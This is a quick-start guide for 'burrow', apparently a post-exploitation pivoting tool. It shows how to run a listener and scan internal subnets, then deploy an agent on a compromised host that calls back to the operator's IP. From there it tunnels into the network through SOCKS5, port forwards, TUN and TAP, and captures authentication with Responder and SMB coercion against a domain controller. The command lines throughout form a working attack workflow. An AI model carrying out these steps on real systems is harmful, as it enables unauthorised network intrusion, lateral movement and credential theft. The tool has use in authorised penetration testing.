# Quick Start

## Build

```bash
git clone ssh://git@gitlab.loudmumble.com:2424/loudmumble/burrow.git
cd burrow
make build          # all platforms
# or
make build-local    # current platform only
```

Binaries land in `build/`.

## 1. Start the Server

```bash
sudo ./burrow server --listen 0.0.0.0:11601
```

The server generates a TLS certificate on first run and prints a fingerprint:

```
[*] TLS fingerprint: AB:CD:EF:01:23:45:67:89:...
[*] Listening on 0.0.0.0:11601 (transport: raw)
```

Copy the fingerprint — the agent needs it to verify the server's identity.

`sudo` is only needed if you plan to use TUN or TAP mode. For SOCKS5-only usage, run without sudo on a high port.

## 2. Network Enumeration

Before deploying an agent, scan the network to find targets:

```bash
# Quick scan — find live hosts
burrow scan -s 10.10.10.0/24

# Scan with service detection (find that printer!)
burrow scan -s 10.10.10.0/24 -v

# Target specific ports with versions
burrow scan -s 10.10.10.0/24 -p 22,80,445,3389,5985 -v
```

## 3. Deploy the Agent

On the compromised host:

```bash
./burrow agent --connect YOUR_IP:11601 --fp AB:CD:EF:01:23:45:67:89:...
```

The agent connects back, and a new session appears in the server TUI.

## 4. View Infrastructure

```bash
# See all sessions, tunnels, routes, and scan results
burrow topology
```

## 5. Start Using It

**SOCKS5 (fastest to get going):**
- Select the session in the TUI, press `Enter` for detail view
- Press `s` to start SOCKS5 on `127.0.0.1:1080`
- Use with proxychains: `proxychains nmap -sT 10.0.0.0/24`

**Port forward:**
- Press `t` in detail view
- Direction: `local`, Listen: `127.0.0.1:3389`, Remote: `10.0.0.5:3389`
- Connect: `xfreerdp /v:127.0.0.1:3389`

**TUN mode (requires sudo on server):**
- Press `Ctrl+T` — Burrow prompts with pre-filled route (e.g. `10.10.10.0/24`)
- Confirm and hit Enter — TUN starts + route added in one step
- All traffic to that subnet now flows through the agent — no proxychains needed

**TAP mode (requires sudo on server, NOT on agent):**
- Press `Ctrl+A` — Burrow prompts for your TAP IP (e.g. `10.10.10.200/24`) and route
- Both are pre-filled from the agent's subnet — verify the IP is unused, hit Enter
- TAP interface created, IP assigned, route added — all in one step
- Run Responder: `sudo responder -I burrow-tap0`
- Coerce to your TAP IP: `nxc smb DC_IP -u user -p pass -M coerce_plus -o L=10.10.10.200`
